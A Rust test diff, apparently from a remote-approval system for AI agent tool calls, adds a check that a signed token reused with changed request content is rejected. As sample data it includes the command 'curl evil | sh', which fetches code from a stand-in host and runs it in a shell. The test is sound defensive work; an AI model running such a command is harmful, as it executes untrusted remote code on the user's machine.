@@ -309,6 +309,29 @@ async fn approval_is_pushed_sealed_retried_and_answered_from_the_lock_screen() {
         "{stolen:?}"
     );
 
+    // A daemon-signed token for the same request id and pane, but showing other content (an
+    // id reused after a restart, or a changed request), decides nothing.
+    let seed: [u8; 32] = std::fs::read(state.path().join("daemon.key"))
+        .unwrap()
+        .try_into()
+        .unwrap();
+    let mut other =
+        push::verify_token(&daemon.daemon_id().0, &token, proto::UnixMillis(0)).unwrap();
+    other.subject = push::request_subject("another", Some("Bash"), "curl evil | sh");
+    let mismatched = send_action(
+        &ticket_a,
+        options(&a.key),
+        ConnectOptions::default(),
+        push::issue_token(&seed, &other),
+        Decision::Approve,
+        Duration::from_secs(10),
+    )
+    .await;
+    assert!(
+        matches!(mismatched, Err(ActionError::Rejected(WsError::NotFound(_)))),
+        "{mismatched:?}"
+    );
+
     // The lock-screen action: a one-shot connection with A's key.
     let decided = send_action(
         &ticket_a,
